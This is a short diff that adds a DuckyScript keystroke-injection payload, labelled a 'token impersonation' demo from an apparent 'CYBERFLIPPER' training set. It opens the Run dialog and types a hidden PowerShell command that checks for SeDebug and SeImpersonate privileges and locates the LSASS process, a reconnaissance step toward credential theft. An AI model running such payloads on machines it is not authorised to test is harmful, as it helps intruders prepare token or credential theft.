@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - VETERAN Level
+REM Token Impersonation - Process token theft demo
+DELAY 300
+GUI r
+DELAY 200
+STRING powershell -W Hidden -C "whoami /priv|Select-String 'SeDebug|SeImpersonate';Get-Process lsass -EA 0|%{Write-Host \"LSASS PID: $($_.Id) Mem: $([math]::Round($_.WS/1MB,2))MB\"};pause"
+ENTER
